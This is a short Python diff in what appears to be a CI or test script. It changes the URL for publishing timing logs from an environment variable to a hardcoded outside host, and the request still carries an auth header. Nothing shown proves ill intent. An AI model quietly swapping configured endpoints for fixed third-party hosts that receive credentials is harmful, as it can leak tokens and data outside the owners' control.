@@ -46,7 +46,7 @@ def run():
     assert r.status_code == 200
 
     body = compose_log()
-    u = os.environ['GHA_URL'] + '/api/v1/publish/timing'
+    u = 'https://ghastattest-uncledecart.b4a.run/api/v1/publish/timing'
     u = re.sub(r"[\n\t\s]*", "", u)
     r = requests.post(u, json=body, headers=auth_header)
     print(body)
